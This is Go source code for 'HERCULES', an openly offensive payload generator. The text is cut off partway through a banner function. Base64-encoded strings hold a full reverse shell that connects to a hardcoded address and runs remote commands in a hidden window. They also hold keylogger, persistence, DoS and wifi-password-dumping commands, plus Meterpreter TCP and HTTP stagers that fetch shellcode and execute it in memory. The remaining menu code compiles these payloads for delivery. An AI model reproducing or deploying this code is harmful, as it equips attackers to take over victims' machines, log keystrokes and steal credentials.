package main


import "strings"
import "fmt"
import "os"
import "time"
import "strconv"
import "net/http"
import "io/ioutil"
import "os/exec"
import "encoding/base64"
import "color"


const VERSION string = "3.0.2"

var HERCULES_REVERSE_SHELL string = "cGFja2FnZSBtYWluCgppbXBvcnQgIm5ldCIKaW1wb3J0ICJvcy9leGVjIgppbXBvcnQgImJ1ZmlvIgppbXBvcnQgInN0cmluZ3MiCmltcG9ydCAic3lzY2FsbCIKaW1wb3J0ICJ0aW1lIgppbXBvcnQgIkVHRVNQTE9JVCIKCgoKY29uc3QgSVAgc3RyaW5nID0gIjEwLjEwLjEwLjg0Igpjb25zdCBQT1JUIHN0cmluZyA9ICI1NTU1IgoKY29uc3QgQkFDS0RPT1IgYm9vbCA9IGZhbHNlOwpjb25zdCBFTUJFRERFRCBib29sID0gZmFsc2U7CmNvbnN0IFRJTUVfREVMQVkgdGltZS5EdXJhdGlvbiA9IDU7Ly9TZWNvbmQKCmNvbnN0IEI2NF9CSU5BUlkgc3RyaW5nID0gIi8vSU5TRVJULUJJTkFSWS1IRVJFLy8iCmNvbnN0IEJJTkFSWV9OQU1FIHN0cmluZyA9ICJ3aW51cGR0LmV4ZSIKCnZhciBHTE9CQUxfQ09NTUFORCBzdHJpbmc7CnZhciBQQVJBTUVURVJTIHN0cmluZzsKdmFyIEtleUxvZ3Mgc3RyaW5nOwoKCgpmdW5jIG1haW4oKSB7CgoKICBpZiBFTUJFRERFRCA9PSB0cnVlIHsKICAgIEVHRVNQTE9JVC5EaXNwYXRjaChCNjRfQklOQVJZLCBCSU5BUllfTkFNRSwgUEFSQU1FVEVSUykKICB9CgoKICBpZiBCQUNLRE9PUiA9PSB0cnVlIHsKICAgIEVHRVNQTE9JVC5QZXJzaXN0ZW5jZSgpCiAgfQoKICBjb25uZWN0LCBlcnIgOj0gbmV0LkRpYWwoInRjcCIsIElQKyI6IitQT1JUKTsKICBpZiBlcnIgIT0gbmlsIHsKICAgIHRpbWUuU2xlZXAoVElNRV9ERUxBWSp0aW1lLlNlY29uZCk7CiAgICBtYWluKCk7CiAgfTsKCgoKICBEaXIsIFZlcnNpb24sIFVzZXJuYW1lLCBBViA6PSBFR0VTUExPSVQuU3lzZ3VpZGUoKQogIFN5c0d1aWRlIDo9IChCQU5ORVIgKyAiIyBTWVNHVUlERVxuIiArICJ8IiArIHN0cmluZyhWZXJzaW9uKSArICJ8XG58XG5+PiBVc2VyIDogIiArIHN0cmluZyhVc2VybmFtZSkgKyAiXG58XG58XG5+PiBBViA6ICIgKyBzdHJpbmcoQVYpICArICJcblxuXG4iICsgc3RyaW5nKERpcikgKyAiPiIpCiAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoc3RyaW5nKFN5c0d1aWRlKSkpOwoKCgogIGZvciB7CgogICAgQ29tbWFuZCwgXyA6PSBidWZpby5OZXdSZWFkZXIoY29ubmVjdCkuUmVhZFN0cmluZygnXG4nKTsKICAgIF9Db21tYW5kIDo9IHN0cmluZyhDb21tYW5kKTsKICAgIEdMT0JBTF9DT01NQU5EID0gX0NvbW1hbmQ7CgoKCiAgICBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifnBsZWFzZSIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+UExFQVNFIikgewogICAgICBjb25uZWN0LldyaXRlKFtdYnl0ZShFR0VTUExPSVQuUGxlYXNlKEdMT0JBTF9DT01NQU5EKSkpOwogICAgfWVsc2UgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5NRVRFUlBSRVRFUiIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+bWV0ZXJwcmV0ZXIiKSB7CiAgICAgIFRlbXBfQWRkcmVzcyA6PSBzdHJpbmdzLlNwbGl0KF9Db21tYW5kLCAiXCIiKS8vfm1ldGVycHJldGVyIC0tdGNwICIxMjcuMC4wLjE6NDQ0NCIKICAgICAgQWRkcmVzcyA6PSBzdHJpbmcoVGVtcF9BZGRyZXNzWzFdKQogICAgICBDb25UeXBlIDo9IHN0cmluZ3MuU3BsaXQoX0NvbW1hbmQsICIgIikKICAgICAgQ29uVHlwZVsxXSA9IHN0cmluZ3MuVHJpbVByZWZpeChDb25UeXBlWzFdLCAiLS0iKQogICAgICBFR0VTUExPSVQuTWV0ZXJwcmV0ZXIoQ29uVHlwZVsxXSwgQWRkcmVzcykKICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoIlxuXG5bK10gTWV0ZXJwcmV0ZXIgRXhlY3V0ZWQgIVxuXG4iK0RpcisiPiIpKTsKICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+TUlHUkFURSIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+bWlncmF0ZSIpIHsKICAgICAgVGVtcF9BZGRyZXNzIDo9IHN0cmluZ3MuU3BsaXQoX0NvbW1hbmQsICJcIiIpLy9+bWlncmF0ZSAiMTI3LjAuMC4xOjQ0NDQiIDEyMTIKICAgICAgQWRkcmVzcyA6PSBzdHJpbmcoVGVtcF9BZGRyZXNzWzFdKQogICAgICBQaWQgOj0gc3RyaW5ncy5TcGxpdChfQ29tbWFuZCwgIiAiKQogICAgICBSZXN1bHQsIEVycm9yIDo9IEVHRVNQTE9JVC5NaWdyYXRlKFBpZFsyXSwgQWRkcmVzcykKICAgICAgaWYgUmVzdWx0ID09IHRydWUgewogICAgICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoIlxuXG5bK10gU3VjY2VzZnVsbHkgTWlncmF0ZWQgIVxuXG4iK0RpcisiPiIpKTsKICAgICAgfWVsc2V7CiAgICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoIlxuXG4iK0Vycm9yKyJcblxuIitEaXIrIj4iKSk7CiAgICAgIH0KICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+RE9TIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5kb3MiKSB7CiAgICAgIERPU19Db21tYW5kIDo9IHN0cmluZ3MuU3BsaXQoR0xPQkFMX0NPTU1BTkQsICJcIiIpCiAgICAgIHZhciBET1NfVGFyZ2V0IHN0cmluZyA9ICBET1NfQ29tbWFuZFsxXQogICAgICBpZiBzdHJpbmdzLkNvbnRhaW5zKHN0cmluZyhET1NfVGFyZ2V0KSwgImh0dHAiKSB7CiAgICAgICAgZ28gRUdFU1BMT0lULkRvcyhET1NfVGFyZ2V0KTsKICAgICAgICBjb25uZWN0LldyaXRlKFtdYnl0ZSgiXG5cblsqXSBTdGFydGluZyBET1MgYXRhY2suLi4iKyJcblxuWypdIFNlbmRpbmcgMTAwMCByZXF1ZXN0IHRvICIrRE9TX1RhcmdldCsiICFcblxuIitEaXIrIj4iKSk7CiAgICAgIH1lbHNlewogICAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKCJcblxuWy1dIEVSUk9SOiBJbnZhbGlkIHVybCAhXG5cbiIrRGlyKyI+IikpOwogICAgICB9CiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifkRJU1RSQUNUIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5kaXN0cmFjdCIpIHsKICAgICAgRUdFU1BMT0lULkRpc3RyYWNrdCgpOwogICAgfWVsc2UgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5LRVlMT0dHRVItREVQTE9ZIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5rZXlsb2dnZXItZGVwbG95IikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5LZXlsb2dnZXItRGVwbG95Iil7CiAgICAgIGdvIEVHRVNQTE9JVC5LZXlsb2dnZXIoJktleUxvZ3MpOwogICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoc3RyaW5nKCJcblsqXSBLZXlsb2dnZXIgZGVwbG95IGNvbXBsZXRlZFxuIiArICJcbiIgKyBzdHJpbmcoRGlyKSArICI+IikpKTsKICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+S0VZTE9HR0VSLURVTVAiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifmtleWxvZ2dlci1kdW1wIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5LZXlsb2dnZXItRHVtcCIpewogICAgICBEdW1wX091dHB1dCA6PSBzdHJpbmcoIiMjIyMjIyMjIyMjIyMjIyMjIyBLRVlMT0dHRVIgRFVNUCAjIyMjIyMjIyMjIyMjIyMjIyMiICsgIlxuXG4iICsgc3RyaW5nKEtleUxvZ3MpICsgIlxuIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyIgKyAiXG4iK3N0cmluZyhEaXIpKyI+Iik7CiAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKER1bXBfT3V0cHV0KSk7CiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifldJRkktTElTVCIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+d2lmaS1saXN0IikgewogICAgICBMaXN0IDo9IEVHRVNQTE9JVC5XaWZpTGlzdCgpOwogICAgICBjb25uZWN0LldyaXRlKFtdYnl0ZShzdHJpbmcoTGlzdCkpKTsKICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+SEVMUCIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+aGVscCIpIHsKICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoc3RyaW5nKEhFTFArRGlyKyI+IikpKTsKICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+UEVSU0lTVEVOQ0UiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifnBlcnNpc3RlbmNlIikgewogICAgICBnbyBFR0VTUExPSVQuUGVyc2lzdGVuY2UoKTsKICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoIlxuXG5bKl0gQWRkaW5nIHBlcnNpc3RlbmNlIHJlZ2lzdHJpZXMuLi5cblsqXSBQZXJzaXN0ZW5jZSBDb21wbGV0ZWRcblxuIiArIHN0cmluZyhEaXIpICsiPiIpKTsKICAgIH1lbHNlewogICAgICBjbWQgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCBfQ29tbWFuZCk7CiAgICAgIGNtZC5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogICAgICBvdXQsIF8gOj0gY21kLk91dHB1dCgpOwogICAgICBDb21tYW5kX091dHB1dCA6PSBzdHJpbmcoIlxuXG4iK3N0cmluZyhvdXQpKyJcbiIrc3RyaW5nKERpcikrIj4iKTsKICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoQ29tbWFuZF9PdXRwdXQpKTsKICAgIH07CiAgfTsKfTsKCgoKCgoKdmFyIEJBTk5FUiBzdHJpbmcgPSBgCiAgICAgICAgICAgICAgICAgIF9fICBfX19fX19fX19fX18gIF9fX19fX19fICBfX19fICAgIF9fX19fX19fX19fCiAgICAgICAgICAgICAgICAgLyAvIC8gLyBfX19fLyBfXyBcLyBfX19fLyAvIC8gLyAvICAgLyBfX19fLyBfX18vCiAgICAgICAgICAgICAgICAvIC9fLyAvIF9fLyAvIC9fLyAvIC8gICAvIC8gLyAvIC8gICAvIF9fLyAgXF9fIFwKICAgICAgICAgICAgICAgLyBfXyAgLyAvX19fLyBfLCBfLyAvX19fLyAvXy8gLyAvX19fLyAvX19fIF9fXy8gLwogICAgICAgICAgICAgIC9fLyAvXy9fX19fXy9fLyB8X3xcX19fXy9cX19fXy9fX19fXy9fX19fXy8vX19fXy8KCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIEhFUkNVTEVTIFJFVkVSU0UgU0hFTEwgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwpgCgoKCgp2YXIgSEVMUCBzdHJpbmcgPSBgCgogICAgICAgICAgICAgICAgICBfXyAgX19fX19fX19fX19fICBfX19fX19fXyAgX19fXyAgICBfX19fX19fX19fXwogICAgICAgICAgICAgICAgIC8gLyAvIC8gX19fXy8gX18gXC8gX19fXy8gLyAvIC8gLyAgIC8gX19fXy8gX19fLwogICAgICAgICAgICAgICAgLyAvXy8gLyBfXy8gLyAvXy8gLyAvICAgLyAvIC8gLyAvICAgLyBfXy8gIFxfXyBcCiAgICAgICAgICAgICAgIC8gX18gIC8gL19fXy8gXywgXy8gL19fXy8gL18vIC8gL19fXy8gL19fXyBfX18vIC8KICAgICAgICAgICAgICAvXy8gL18vX19fX18vXy8gfF98XF9fX18vXF9fX18vX19fX18vX19fX18vL19fX18vCgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyBIRVJDVUxFUyBSRVZFUlNFIFNIRUxMICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKCgp+UEVSU1NJU1RFTkNFICAgICAgICAgICAgICAgICAgICAgICAgIEluc3RhbGxzIGEgcGVyc2lzdGVuY2UgbW9kdWxlIGZvciBjb250aW5pb3VzIGFjY2VzCgp+RElTVFJBQ1QgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEV4ZWN1dGVzIGEgZm9yayBib21iIGJhdCBmaWxlIGZvciBkaXN0cmFjdGlvbgoKflBMRUFTRSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBBc2tzIHVzZXJzIGNvbWZpcm1hdGlvbiBmb3IgaGlnaGVyIHByaXZpbGlkZ2Ugb3BlcmF0aW9ucwoKfkRPUyAtQSAid3d3LnRhcmdldHNpdGUuY29tIiAgICAgICAgICBTdGFydHMgYSBkZW5pYWwgb2Ygc2VydmljZSBhdGFjawoKfldJRkktTElTVCAJCQkJCQkgICAgICAgICAgICAgICAgRHVtcHMgYWxsIHdpZmkgaGlzdG9yeSBkYXRhIHdpdGggcGFzc3dvcmRzCgp+TUVURVJQUkVURVIgLS1odHRwICIxMC4wLjAuMTo0NDQ0IiAgIENyZWF0ZXMgYSBtZXRlcnByZXRlciBjb25uZWN0aW9uIHRvIG1ldGFzcGxvaXQgKGh0dHAvaHR0cHMvdGNwKQoKfktFWUxPR0dFUi1ERVBMT1kgICAgICAgICAgICAgICAgICAgICBJbnN0YWxscyBhIGtleWxvZ2dlciBtb2R1bGUgYW5kIGxvZ3MgYWxsIGtleXN0cm9rZXMKCn5LRVlMT0dHRVItRFVNUCAgICAgICAgICAgICAgICAgICAgICAgRHVtcHMgYWxsIGxvZ2VkIGtleXN0cm9rZXMKCn5NSUdSQVRFICIxMC4wLjAuMTo0NDQ0IiAyMjIyICAgICAgICAgQ3JlYXRlcyBhIHJldmVyc2UgaHR0cCBtZXRlcnByZXRlciBzZXNzaW9uIGF0IGdpdmVuIHBpZCAoRVhQRVJJTUVOVEFMKQoKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgpgCg=="
var METERPRETER_TCP string = "cGFja2FnZSBtYWluCgoKaW1wb3J0ICJlbmNvZGluZy9iaW5hcnkiCmltcG9ydCAic3lzY2FsbCIKaW1wb3J0ICJ1bnNhZmUiCmltcG9ydCAiRUdFU1BMT0lUL1JTRSIKCmNvbnN0IE1FTV9DT01NSVQgID0gMHgxMDAwCmNvbnN0IE1FTV9SRVNFUlZFID0gMHgyMDAwCmNvbnN0IFBBR0VfQWxsb2NhdGVVVEVfUkVBRFdSSVRFICA9IDB4NDAKCgp2YXIgSzMyID0gc3lzY2FsbC5OZXdMYXp5RExMKCJrZXJuZWwzMi5kbGwiKQp2YXIgVmlydHVhbEFsbG9jID0gSzMyLk5ld1Byb2MoIlZpcnR1YWxBbGxvYyIpCgoKZnVuYyBBbGxvY2F0ZShTaGVsbGNvZGUgdWludHB0cikgKHVpbnRwdHIpIHsKCglBZGRyLCBfLCBfIDo9IFZpcnR1YWxBbGxvYy5DYWxsKDAsIFNoZWxsY29kZSwgTUVNX1JFU0VSVkV8TUVNX0NPTU1JVCwgUEFHRV9BbGxvY2F0ZVVURV9SRUFEV1JJVEUpCglpZiBBZGRyID09IDAgewoJCW1haW4oKQoJfQoJcmV0dXJuIEFkZHIKfQoKZnVuYyBtYWluKCkgewoJLy9SU0UuUGVyc2lzdGVuY2UoKQoJdmFyIFdTQV9EYXRhIHN5c2NhbGwuV1NBRGF0YQoJc3lzY2FsbC5XU0FTdGFydHVwKHVpbnQzMigweDIwMiksICZXU0FfRGF0YSkKCVNvY2tldCwgXyA6PSBzeXNjYWxsLlNvY2tldChzeXNjYWxsLkFGX0lORVQsIHN5c2NhbGwuU09DS19TVFJFQU0sIDApCglTb2NrZXRfQWRkciA6PSBzeXNjYWxsLlNvY2thZGRySW5ldDR7UG9ydDogNTU1NSwgQWRkcjogWzRdYnl0ZXsxMjcsMCwwLDF9fQoJc3lzY2FsbC5Db25uZWN0KFNvY2tldCwgJlNvY2tldF9BZGRyKQoJdmFyIExlbmd0aCBbNF1ieXRlCglXU0FfQnVmZmVyIDo9IHN5c2NhbGwuV1NBQnVme0xlbjogdWludDMyKDQpLCBCdWY6ICZMZW5ndGhbMF19CglVaXRuWmVyb18xIDo9IHVpbnQzMigwKQoJRGF0YVJlY2VpdmVkIDo9IHVpbnQzMigwKQoJc3lzY2FsbC5XU0FSZWN2KFNvY2tldCwgJldTQV9CdWZmZXIsIDEsICZEYXRhUmVjZWl2ZWQsICZVaXRuWmVyb18xLCBuaWwsIG5pbCkKCUxlbmd0aF9pbnQgOj0gYmluYXJ5LkxpdHRsZUVuZGlhbi5VaW50MzIoTGVuZ3RoWzpdKQoJaWYgTGVuZ3RoX2ludCA8IDEwMCB7CgkJbWFpbigpCgl9CglTaGVsbGNvZGVfQnVmZmVyIDo9IG1ha2UoW11ieXRlLCBMZW5ndGhfaW50KQoKCXZhciBTaGVsbGNvZGUgW11ieXRlCglXU0FfQnVmZmVyID0gc3lzY2FsbC5XU0FCdWZ7TGVuOiBMZW5ndGhfaW50LCBCdWY6ICZTaGVsbGNvZGVfQnVmZmVyWzBdfQoJVWl0blplcm9fMSA9IHVpbnQzMigwKQoJRGF0YVJlY2VpdmVkID0gdWludDMyKDApCglUb3RhbERhdGFSZWNlaXZlZCA6PSB1aW50MzIoMCkKCWZvciBUb3RhbERhdGFSZWNlaXZlZCA8IExlbmd0aF9pbnQgewoJCXN5c2NhbGwuV1NBUmVjdihTb2NrZXQsICZXU0FfQnVmZmVyLCAxLCAmRGF0YVJlY2VpdmVkLCAmVWl0blplcm9fMSwgbmlsLCBuaWwpCgkJZm9yIGkgOj0gMDsgaSA8IGludChEYXRhUmVjZWl2ZWQpOyBpKysgewoJCQlTaGVsbGNvZGUgPSBhcHBlbmQoU2hlbGxjb2RlLCBTaGVsbGNvZGVfQnVmZmVyW2ldKQoJCX0KCQlUb3RhbERhdGFSZWNlaXZlZCArPSBEYXRhUmVjZWl2ZWQKCX0KCglBZGRyIDo9IEFsbG9jYXRlKHVpbnRwdHIoTGVuZ3RoX2ludCArIDUpKQoJQWRkclB0ciA6PSAoKls5OTAwMDBdYnl0ZSkodW5zYWZlLlBvaW50ZXIoQWRkcikpCglTb2NrZXRQdHIgOj0gKHVpbnRwdHIpKHVuc2FmZS5Qb2ludGVyKFNvY2tldCkpCglBZGRyUHRyWzBdID0gMHhCRgoJQWRkclB0clsxXSA9IGJ5dGUoU29ja2V0UHRyKQoJQWRkclB0clsyXSA9IDB4MDAKCUFkZHJQdHJbM10gPSAweDAwCglBZGRyUHRyWzRdID0gMHgwMAoJZm9yIEJwdUFLckp4ZmwsIElJbmdhY01hQmggOj0gcmFuZ2UgU2hlbGxjb2RlIHsKCQlBZGRyUHRyW0JwdUFLckp4ZmwrNV0gPSBJSW5nYWNNYUJoCgl9CgkvL1JTRS5NaWdyYXRlKEFkZHIsIGludChMZW5ndGhfaW50KSkKCXN5c2NhbGwuU3lzY2FsbChBZGRyLCAwLCAwLCAwLCAwKQp9CgovKgoKMS4gQ3JlYXRlIFdTQSBEQVRBIHZlcnNpb24gMi4yCjIuIENyZWF0ZSBhIFdTQSBTb2NrZXQKMy4gQ3JlYXRlIFdTQSBTb2NrZXQgQWRkcmVzcyBvYmplY3QKNC4gQ29ubmVjdAo1LiBDcmVhdGUgNCBieXRlIHNlY29uZCBzdGFnZSBsZW5ndGggYXJyYXkKNi4gQ3JlYXRlIGEgV1NBIEJ1ZmZlciBvYmplY3QgcG9pbnRpbmcgc2Vjb25kIHN0YWdlIGxlbmd0aCBhcnJheQo3LiBSZWNlaXZlIDQgYnl0ZXMgV1NBUmVjdiB0byBzZWNvbmQgc3RhZ2UgbGVuZ3RoIGFycmF5CjguIENvbnZlcnQgc2Vjb25kIHN0YWdlIGxlbmd0aCB0byBpbnQKOS4gQ3JlYXRlIGEgYnl0ZSBhcnJheSBhdCB0aGUgc2l6ZSBvZiBzZWNvbmQgc3RhZ2UgYnl0ZSBhcnJheSBmb3Igc2Vjb25kIHN0YWdlIHNoZWxsY29kZQoxMC4gQ3JlYXRlIGEgdW5kZWZpbmVkIGJ5dGUgYXJyYXkKMTEuIENyZWF0ZSBhbm90aGVyIFdTQSBidWZmZXIgb2JqZWN0IHBvaW50aW5nIGF0IHNlY29uZCBzdGFnZSBzaGVsbGNvZGUgYnl0ZSBhcnJheQoxMi4gQ29uc3RydWN0IGEgbmVzdGVkIGZvciBsb29wIHRoYXQgcmVjZWl2ZXMgYnl0ZXMgYW5kIGFwcGVuZHMgdGhlbSBpbnRvIHVuZGVmaW5lZCBieXRlIGFycmF5CjEzLiBBbGxvY2F0ZSBzcGFjZSBpbiBtZW1vcnkgYXQgdGhlIHNpemUgb2YgKHNlY29uZCBzdGFnZSBzaGVsbGNvZGUgKyA1KQoxNC4gQ3JlYXRlIGEgcG9pbnRlciB0aGF0IHBvaW50cyB0byBXU0EgU29ja2V0CjE1LiBBc3NpbmcgMHhCRihtb3YgZWRpKSB0byBmaXN0IGJ5dGUgb2YgYWxsb2NhdGVkIG1lbW9yeQoxNi4gQXNzaW5nIFdTQSBTb2NrZXQgcG9pbnRlciB0byBzZWNvbmQgYnl0ZSBvZiBhbGxvY2F0ZWQgbWVtb3J5CjE3LiBBc3NpbmcgdHJlZSBudWxsIGJ5dGVzIGFmdGVyIHNlY29uZCBieXRlIG9mIGFsbG9jYXRlZCBtZW1vcnkKMTguIE1vdmUgc2hlbGxjb2RlIGJ5dGVzIHRvIGFsbG9jYXRlZCBtZW1vcnkgc3RhcnRpbmcgYXQgZmlmdCBieXRlCjE5LiBNYWtlIGEgc3lzY2FsbCB0byBhbGxvY2F0ZWQgbWVtb3J5IGFkZHJlc3MKKi8K"
var METERPRETER_HTTP_HTTPS string = "cGFja2FnZSBtYWluCgppbXBvcnQgIm5ldC9odHRwIgppbXBvcnQgInN5c2NhbGwiCmltcG9ydCAidW5zYWZlIgppbXBvcnQgImlvL2lvdXRpbCIKLy9pbXBvcnQgIkVHRVNQTE9JVC9SU0UiCgoKCmNvbnN0IE1FTV9DT01NSVQgID0gMHgxMDAwCmNvbnN0IE1FTV9SRVNFUlZFID0gMHgyMDAwCmNvbnN0IFBBR0VfQWxsb2NhdGVVVEVfUkVBRFdSSVRFICA9IDB4NDAKCnZhciBLMzIgPSBzeXNjYWxsLk5ld0xhenlETEwoImtlcm5lbDMyLmRsbCIpCnZhciBWaXJ0dWFsQWxsb2MgPSBLMzIuTmV3UHJvYygiVmlydHVhbEFsbG9jIikKdmFyIEFkZHJlc3Mgc3RyaW5nID0gImh0dHA6Ly8xMjcuMC4wLjE6ODA4MC8iCnZhciBDaGVja3N1bSBzdHJpbmcgPSAiMTAyMDExYjd0eHBsNzFuIgoKCgpmdW5jIG1haW4oKSB7CiAgLy9SU0UuUGVyc2lzdGVuY2UoKQogIEFkZHJlc3MgKz0gQ2hlY2tzdW0KICBSZXNwb25zZSwgZXJyIDo9IGh0dHAuR2V0KEFkZHJlc3MpCiAgaWYgZXJyICE9IG5pbCB7CiAgICBtYWluKCkKICB9CiAgU2hlbGxjb2RlLCBfIDo9IGlvdXRpbC5SZWFkQWxsKFJlc3BvbnNlLkJvZHkpCgogIEFkZHIsIF8sIGVyciA6PSBWaXJ0dWFsQWxsb2MuQ2FsbCgwLCB1aW50cHRyKGxlbihTaGVsbGNvZGUpKSwgTUVNX1JFU0VSVkV8TUVNX0NPTU1JVCwgUEFHRV9BbGxvY2F0ZVVURV9SRUFEV1JJVEUpCiAgaWYgQWRkciA9PSAwIHsKICAgIG1haW4oKQogIH0KICBBZGRyUHRyIDo9ICgqWzk5MDAwMF1ieXRlKSh1bnNhZmUuUG9pbnRlcihBZGRyKSkKICBmb3IgaSA6PSAwOyBpIDwgbGVuKFNoZWxsY29kZSk7IGkrKyB7CiAgICBBZGRyUHRyW2ldID0gU2hlbGxjb2RlW2ldCiAgfQogIC8vUlNFLk1pZ3JhdGUoQWRkciwgbGVuKFNoZWxsY29kZSkpCiAgc3lzY2FsbC5TeXNjYWxsKEFkZHIsIDAsIDAsIDAsIDApCgp9Cg=="

type PAYLOAD struct {
  Ip string
  Port string
  Type int
  Size string
  UPX_Size string
  MidSize string
  FullSize string
  Score float32
  FileName string
  SourceCode string
  Persistence bool
  Migrate bool
  UPX bool

}

var Payload PAYLOAD
var MenuSelection int
var Ask string
var NO int



func main() {

  Green := color.New(color.FgGreen)
  BoldGreen := Green.Add(color.Bold)
  Yellow := color.New(color.FgYellow)
  BoldYellow := Yellow.Add(color.Bold)
  Red := color.New(color.FgRed)
  BoldRed := Red.Add(color.Bold)


  Result := CheckSetup()

  if Result == false {
    ClearScreen()
    PrintBanner()
    PrintCredit()

    BoldRed.Println("\n\n[!] HERCULES is not installed properly, please run setup.sh")

    os.Exit(1)

  }

  ClearScreen()
  PrintBanner()
  PrintCredit()
  Menu_1()

  fmt.Scan(&MenuSelection)

  ClearScreen()

  if MenuSelection == 1 {
    PrintBanner()
    PrintPayloads()
    fmt.Print("\n\n[*] Select : ")
    fmt.Scan(&NO)
    PreparePayload(NO)

    fmt.Print("\n\n[*] Enter the base name for output files : ")
    fmt.Scan(&Payload.FileName)
    CompilePayload()
    AskUPX()
    FinalView()
  }else if MenuSelection == 2 {
    ClearScreen()
    PrintBanner()
    PrintCredit()
    BoldRed.Println("\n\n[!] Bind payload option will be added at next version...")
    time.Sleep(3*time.Second)
    main()
  }else if MenuSelection == 3 {
    ClearScreen()
    PrintBanner()
    PrintCredit()
    fmt.Println("\n\n")
    Result := ChecVersion()
    if strings.Contains(Result, "[!]") {
      BoldRed.Println(Result)
      if Result == "[!] New version detected" {
        BoldYellow.Print("\nDo you want to upgrade ? (y/n) : ")
        fmt.Scan(&Ask)
        if Ask == "y" || Ask == "Y" {
          Update := exec.Command("sh", "-c", "chmod 777 UPDATE && sudo ./UPDATE")
          Update.Stdout = os.Stdout
          Update.Start()
          os.Exit(1)
        }else{
          main()
        }
      }
    }else{
      BoldGreen.Println(Result)
      time.Sleep(3*time.Second)
      main()
    }
  }else{
    main()
  }


}

func CheckSetup()  (bool){

  DirList, _ := exec.Command("sh", "-c", "cd /usr/lib/go-1.6/src && ls").Output()
  DirList2, _ := exec.Command("sh", "-c", "cd /usr/lib/go/src && ls").Output()
  GoVer, _ := exec.Command("sh", "-c", "go version").Output()
  UPX, _ := exec.Command("sh", "-c", "upx").Output()

  if (!(strings.Contains(string(DirList), "EGESPLOIT"))) && (!(strings.Contains(string(DirList2), "EGESPLOIT"))) {
    return false
  }

  if !(strings.Contains(string(GoVer), "version")) {
    return false
  }
  if !(strings.Contains(string(UPX), "Markus")) {
    return false
  }
  return true
}


func ChecVersion()  (string){//https://raw.githubusercontent.com/EgeBalci/HERCULES/master/SOURCE/HERCULES.go

  Response, Error := http.Get("https://raw.githubusercontent.com/EgeBalci/HERCULES/master/SOURCE/HERCULES.go")
  if Error != nil {
    return "[!] ERROR : Connection attempt failed"
  }
  Body, _ := ioutil.ReadAll(Response.Body)

  Version := string(`"`+VERSION+`"`)

  if !(strings.Contains(string(Body), Version)) {
    return "[!] New version detected"
  }else{
    return "[+] HERCULES is up to date"
  }

}


func PrintBanner()  {
  color.Red(" ██░ ██ ▓█████  ██▀███   ▄████▄   █    ██  ██▓    ▓█████   ██████ ")
  color.Red("▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒▒██▀ ▀█   ██  ▓██▒▓██▒    ▓█   ▀ ▒██    ▒ ")
  color.Red("▒██▀▀██░▒███   ▓██ ░▄█ ▒▒▓█    ▄ ▓██  ▒██░▒██░    ▒███   ░ ▓██▄   ")
  color.Red("░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄  ▒▓▓▄ ▄██▒▓▓█  ░██░▒██░    ▒▓█  ▄   ▒   ██▒")
  color.Red("░▓█▒░██▓░▒████▒░██▓ ▒██▒▒ ▓███▀ ░▒▒█████▓ ░██████▒░▒████▒▒██████▒▒")
